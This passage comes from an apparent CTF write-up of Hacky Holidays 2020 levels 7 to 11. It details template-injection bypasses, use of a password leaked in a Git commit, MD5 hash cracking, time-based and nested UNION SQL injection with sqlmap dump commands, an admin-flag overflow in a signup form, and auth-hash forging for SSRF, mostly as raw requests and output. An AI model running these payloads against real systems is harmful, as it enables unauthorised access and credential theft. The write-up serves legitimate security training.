Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

preview_markup=Hello+%7B%7Bname%7D%7D+%7B%7Btemplate%3Aindex.html%7D%7D+%7B%7Bemail%7D%7D&preview_data=%7B%22name%22%3A%22Alice%22%2C%22email%22%3A%22alice%40test.com%22%7D
```

**Response**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 11:55:18 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 47

Cannot find template file /templates/index.html
```

+ In the response we got a response as "Cannot find template file /templates/index.html", which means there must be a path "templates" after "hate-mail-generator".

+ Without bruteforcing and checking directly - https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ and got the directory preview with html files

**Request**

https://hackyholidays.h1ctf.com/hate-mail-generator/templates/ 

**Response**

{F1139430}

```
Index of /hate-mail-generator/templates/

../
cbdj3_grinch_header.html                                     20-Apr-2020 10:00                   -
cbdj3_grinch_footer.html                                     20-Apr-2020 10:00                   -
38dhs_admins_only_header.html                                21-Apr-2020 15:29                  46
```

+ So I looked at it and saw this file "38dhs_admins_only_header.html" as it was interesting, however visiting the page directly gave 403 error.

**Request**

https://hackyholidays.h1ctf.com/hate-mail-generator/templates/38dhs_admins_only_header.html

**Response**

{F1139433}

+ I know this was not going to be easy, so the next idea that came to my mind is to directly insert "38dhs_admins_only_header.html " inside the template parameter on the  "preview_markup".

**Request**

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 134
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

preview_markup=Hello{{name}}{{template:38dhs_admins_only_header.html}}{{email}}&preview_data={"name":"Alice","email":"alice@test.com"}
```

**Response**

```http

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 12:23:44 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 64

You do not have access to the file 38dhs_admins_only_header.html
```

+ I was like hmm, this also failed as it says about access error.

+ So, another method which can be handy in this type of situation will be reference based exploit. In reference based exploit, we can insert the file "38dhs_admins_only_header.html" inside email parameter on preview_data parameter and just call {{email}} on preview_markup directly to check what will be the output and thus, it was exploited successfully.

**Request**

```http
POST /hate-mail-generator/new/preview HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 106
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/hate-mail-generator/new
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

preview_markup={{email}}&preview_data={"name":"aaaa","email":"{{template:38dhs_admins_only_header.html}}"}
```


**Response**

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 12:28:45 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Content-Length: 339

<html>
<body>
<center>
    <table width="700">
        <tr>
            <td height="80" width="700" style="background-color: #64d23b;color:#FFF" align="center">Grinch Network Admins Only</td>
        </tr>
        <tr>
            <td style="padding:20px 10px 20px 10px">
                <h4>flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}</h4>
```

+ So, in this way, reference parameter bypassed the  file condition check due to reference based parameter exploit and got the response from server which there was an hidden flag inside.

Flag 7 - `flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}`


**Day 8 - CTF level 8**

+ On day 8,  there was new level as https://hackyholidays.h1ctf.com/forum on /apps.

+ Visiting the page directly gave me an idea of the workflow.

{F1139470}
{F1139471}

+ This is an forum area where there are different posts and we need to login to get the access inside.
+ Looking at the posts we can see that there are two users - grinch and max and there is an option to login - 

https://hackyholidays.h1ctf.com/forum/login.

{F1139475}

+ So, first thing I tried to bruteforce passwords area with both username as grinch and max but no luck at all on login area. I was trying to analyze more and more and inspect the element but couldn't find anything.

+ I know the CTF master is "adamtlangley". So, I tried to search his github repo to see if I find anything as intentionally or unintentionally there can be source code leakage, at this point it was all guess.

+ Thus, I search it on google as "site:github.com adamtlangley" and got the link as "https://github.com/adamtlangley".

{F1139482}

+ In the contribution activity, I saw 

```
December 2020
Grinch-Networks/forum 1 commit
```

+ So, I visited the page https://github.com/Grinch-Networks/forum and started the code review one by one on every files. I wanted to see if there are an username and password leaked or not.

+ Analyzed every files, however couln't find anything interesting. Next up, I started to look at commits area - "https://github.com/Grinch-Networks/forum/commits/main", and thus on the second commit as "small fix", it was leaking the username and password for the database.

**Request**
https://github.com/Grinch-Networks/forum/commit/efb92ef3f561a957caad68fca2d6f8466c4d04ae

**Response**

```php

 */
    static public function read(){
        if( gettype(self::$read) == 'string' ) {
            self::$read = new DbConnect( false, 'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$read = new DbConnect( false, '', '','' );
        }
        return self::$read;
    }
@@ -146,7 +146,7 @@ public static function closeAll(){
     */
    static public function write(){
        if( gettype(self::$write) == 'string' ) {
            self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );
            self::$write = new DbConnect( true,  '', '','' );
        }
        return self::$write;
    }
```

+ In `self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`, we can see username and password.

`username - forum, password - 6HgeAZ0qC9T6CQIqJpD`.

+ Next up , as we got the database username and password, first I try to logged into /forum/login, but it was incorrect, next up idea was to bruteforce.
+ In bruteforce, I've used the wordlist as -  https://github.com/danielmiessler/SecLists/blob/d5271820d00935387bdff87d0a79ae5513b47ce3/Discovery/Web-Content/api/objects.txt.

+ Executed the command using ffuf tool - `./ffuf -w /Users/kunalpandey/Desktop/objects.txt -u "https://hackyholidays.h1ctf.com/forum/FUZZ" `

{F1139501}

**Response**

```
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
```

+ So, there is an /forum/phpmyadmin path. I've used the `username - forum, password - 6HgeAZ0qC9T6CQIqJpD` inside phpmyadmin page and logged in successfully, I searched for the tables and finally in the table users, I got the following information:

**Request**
https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user

**Response**

{F1139502}

```
id	username	password	admin
1	grinch	35D652126CA1706B59DB02C93E0C9FBF	1
2	max	388E015BC43980947FCE0E5DB16481D1	
```

+ In the column "admin", it was 1 for username grinch and thus we can say that grinch is an admin. However , password was encrypted. Now, to crack the password, one of the best site can be used over here is https://crackstation.net.

+ In this site, entered the encrypted hash as 35D652126CA1706B59DB02C93E0C9FBF.

{F1139505}

+ Within one second, got the cracked hash as

```
Hash	Type	Result
35D652126CA1706B59DB02C93E0C9FBF	md5	BahHumbug
```

+ So, for username - grinch, password is BahHumbug. Using this credentials, logged in successfully on the page `https://hackyholidays.h1ctf.com/forum/login` and visited the secret plans forum page.

**Request**

https://hackyholidays.h1ctf.com/forum/3/2


**Response**

{F1139510}

```
We've launched our recon server, gathered intelligence and pin pointed Santa's location!
Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!

flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
```

+ In this way, got the flag which was hidden inside secret forum page after logging in.

Flag 8 - `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`.


**Day 9 - CTF level 9**

+ On day 9, The ctf level launched as "Evil quiz" inside /apps.
+ Visited the page https://hackyholidays.h1ctf.com/evil-quiz and got the workflow as :
On page https://hackyholidays.h1ctf.com/evil-quiz, we can provide any name, after submitting the name, it'll navigate to https://hackyholidays.h1ctf.com/evil-quiz/start and thus, on page https://hackyholidays.h1ctf.com/evil-quiz/score, it'll reflect the score.

{F1139518}

+ There was also an admin area inside evil-quiz which was for logged in.

https://hackyholidays.h1ctf.com/evil-quiz/admin

{F1139520}

+ At this point, I thought to not try bruteforce at all and there will be different method this time. So, on previous ctf levels , it was recon, bruteforce , source -code review and api endpoint exploit. Maybe, this time there might be a case for sql injection. 

+ So, tried common payloads using https://github.com/payloadbox/sql-injection-payload-list on name


```
http
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=7ef26002a6768edc128fa085f2097475

name=%22+or+sleep%285%29
```
+ Tried payload as " or sleep(5) on name area.

**Payloads**
{F1139545}

+ After injecting, submitting the request on quiz area

```http
POST /evil-quiz/start HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=7ef26002a6768edc128fa085f2097475

ques_1=0&ques_2=0&ques_3=0
```

**Response**

```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 13:42:56 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /evil-quiz/score
Content-Length: 0
```

+ and then redirected to /evil-quiz/score which was loaded after 5 seconds, that means it was vulnerable to sql injection. This sql injection was of second order because of name was injected on one post request address and output was reflecting on different address `/evil-quiz/score.`

+ In order to exploit even better, I've used tool as sqlmap.

Command - `python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"`

where exploit.txt was defined as

```http
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=7ef26002a6768edc128fa085f2097475

name=%22+or+sleep%285%29
```

{F1139562}

+ Here are command requests and output

**Request**
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"

**Output**
{F1139568}

+ It was detected as a time-based SQL injection on the MySQL database.

**Request**
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --dbs --exclude-sysdbs

{F1139573}

```
Information_schema
quiz
```

**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --tables -D quiz

**Response**

```
Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+
```

**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --columns

**Response**

{F1139598}

```
Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+

Database: quiz
Table: admin
[3 columns]
+----------+
| Column   |
+----------+
| id       |
| password |
| username |
+----------+

```
+ For admin, we got columns as id, username, and password.

+ Final command will dump the information.

**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --dump

**Response**

{F1139603}

```
Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+

Database: quiz
Table: admin
[1 entry]
+----+----------+-------------------+
| id | username | password          |
+----+----------+-------------------+
| 1  | admin    | S3creT_p4ssw0rd-$ |
+----+----------+-------------------+
```

+ After 40 mins of sqlmap, I got username as "admin" and password as "S3creT_p4ssw0rd-$".
+ Next, I visited https://hackyholidays.h1ctf.com/evil-quiz/admin and logged in with the credentials and thus, got the access and the flag.

{F1139611}

```
Evil Quiz Admin
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
```

+ In this way, we got the flag, this ctf level was about SQL injection attack using second order and it was time-based.

Flag 9 - `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

**Day 10 - CTF level 10**

On day 10, it was launched as "https://hackyholidays.h1ctf.com/signup-manager/" on the/apps area.

+ Visit the link and we get the workflow:
There is an option of signup and sign-in function, and once we signin, we get to the user area.

{F1139617}

{F1139618}

+ In the above case, I've registered with username - "test" and password - "test" to see the output, and thus, as we can see there is nothing interesting over there, just a message which says:

`We'll have a look into you and see if you're evil enough to join the grinch army!`

+ At first, I did inspect element on https://hackyholidays.h1ctf.com/signup-manager/, and in the above first line of source-code, one line caught my eye.

```html
<!-- See README.md for assistance -->
<!DOCTYPE html>
<html lang="en">
``` 

+ That means there is a  "README.md" file path over here. After visiting https://hackyholidays.h1ctf.com/signup-manager/README.md, got the following steps describe inside as follows:

```txt
 SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

+ In the second step, there is a mention of the zip file as "signupmanager.zip ".

+ Thus, by visiting https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip, downloaded the zip file and extracted it:

```
files list
admin.php
index.php
README.md
signup.php
user.php
```

{F1139625}

+ README.md was the same as mentioned in the above one.
+ In the REAMDE.md file, there is a point 6 which says:

`6) You can make anyone an admin by changing the last character in the users.txt file to a Y`.

+ It means if we write the value "Y" at the last in the users.txt file, we can be admin.

+ Let's look at the index.php function

```php
<?php
if( isset($_GET["logout"]) ){
    setcookie('token',null,time()-3600);
    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
    exit();
}
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
$all_users = buildUsers();
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
if( $page == 'signup.php' ) {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once($page);

```

+ In the code, inside function buildUsers(), we can see there will be 113 characters that are being written inside users.txt file, and in `'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)`, if 113 character will be Y inside users.txt file, then we can become admin.

```php
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
```

+ It means in order to exploit admin access, we have to somehow exploit the signup area. As the signup area was described inside

`function addUser($username,$password,$age,$firstname,$lastname)`

+ Inside function, we can see we've have to exploit last name with capital "Y" to get the access.

```php
$random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
```

+ Thus, in order to fill up our users.txt for signup functionality, we have to fill up every input field with maximum lengths as well.

+ So, we can see, username - 15, age - 3 , firstname - 15, and password - 15.

+ Now, in the age area we can see the condition as

```php
if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
```
+ But in order to fill up further, we have to fill up more than 3 lengths inside the age area. Thus, in order to do that, we can use the power function as 1e2, 1e3,1e4, 1e5,1e6 etc 

where 1e(n) = 1x10 to the power n, thus let's use 1e6 over here.

+ So, our final exploit will be in the signup area where we will insert maximum characters.


**Request**
```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 122
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

action=signup&username=kunalbrokunal12&password=kunalbrokunal12&age=1e6&firstname=kunalbrokunal12&lastname=YYYYYYYYYYYYYYY
```

**Response**

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 14:51:29 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=16e3f0dd617d5ce9dbdba2c5a1f11b2d; expires=Thu, 31-Dec-2020 15:51:29 GMT; Max-Age=3600
Location: /signup-manager/
Content-Length: 0
```

+ After logging in as username- kunalbrokunal12 and password - kunalbrokunal12, we get the flag as we've successfully written the users.txt with capital "Y" at the end.

{F1139655}

```
Admin Area
flag{99309f0f-1752-44a5-af1e-a03e4150757d}

You made it through, continue to your next task here
```

+ There is also a link for CTF level 11 inside the "here" parameter.

Flag 10 - `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

**Day 11 -CTF level 11**

+ After getting the link from CTF level 10 which is https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 from the "here" parameter.

+ We get the workflow as :

There are photos and albums area with different hash IDs and different payloads. There is also an option of login area inside the https://hackyholidays.h1ctf.com/attack-box/login.

{F1139661}
{F1139662}

+ A message is also displayed as `We are currently developing an API, apologies for anything that doesn't work quite right`.

+ Thus, it means there can be /api endpoint being used inside r3c0n_server_4fdk59. Thus, finally visiting https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api and we can see different response codes:

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api

**Response**

```
Grinch API Status Codes
HTTP Status Code	Explanation
200	Successful request with data returned
204	Successful request but with no data found
404	Invalid Endpoint
400	Invalid GET/POST variable
401	Unauthenticated Request or Invalid client IP
```

+ Also, if we visit any api endpoint like https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/aaa, it'll respond as:

```{"error": "This endpoint cannot be visited from this IP address"}```

+ Thus, we can't visit directly, this must be a case of an SSRF based exploit but need to find the right parameter.

+ In the image parameter for album such as https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop

Image was loaded with base64 encoded parameter:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9

{F1139675}


+ Decoding the base64 parameter gives the output as:

{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}

+ So, I thought to insert api path for ssrf exploit inside the image , so tried the payload as:

```
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api/","auth":"76ba061d356c6264a6005216e1776ba6"} --> encoded base64 parameter --->eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=
```

And visited -  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=

**Response**

invalid authentication hash

+ At this point, I was like how we can exploit the functionality, in order to do that, we have to generate a valid hash for the output.

+ So, I was being with no luck and then, visited hacker101 discord channel where adam posted a hint for "inception image".

+ After I tried SQL injection on album parameter to check whether it's a SQL injection case or not, however, it was:

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%202,NULL,%22aaa%22--%20-

**Response**

+ In the response, it was returning the album column along with images.

{F1139795}

+ It means select 2 means it was selecting album column and then, it struck about adam's inception hint.

+ In the movie inception, we get the dream inside a dream.

+ Thus, if we are selecting the album column and getting the output, thus there might be a chance of double SQL injection where we can select the photo id and if we somehow add the photo id as a random value, then it might generate valid auth hash from the server.

+ After different testing , finally got the double SQL injection.

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/\%22--%20-%22,NULL,%22aaa%27%22--%20-

**Response**

+ In response, we get the image as:

```html
 <div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9">
                    </div>
```
**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9

Base64decoded

`{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}`

**Response**

Invalid content - type detected.

+ In the SQL injection, in the 3rd column inside SQL injection for column album, we successfully generate a valid hash for ../api/.

+ In the above response, for api, we get the response as the invalid content type detected. So, it means the server was accepting only `content-type image` and since the above /api parameter was of html type, the response was 200 but it was invalid content-type detected.

+ Based on that, I've tried to brute-force the api parameter, thinking about the common path.
+ In the workflow of the application, as we require username and password, thus common api paths can be such as api/config, api/users, api/user, api/username, etc.

+ In the above method, I tried api/config and load the picture in the response on firefox and it returned with:

```Expected HTTP status 200, Received: 404```

{F1139834}

+ Thus as per the response says, it was returned with 404. Finally, after guessing the api as api/user on the above SQL payload as:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user/\%22--%20-%22,NULL,%22aaa%27%22--%20-


**Response**

{F1139841}

`Invalid content type detected`

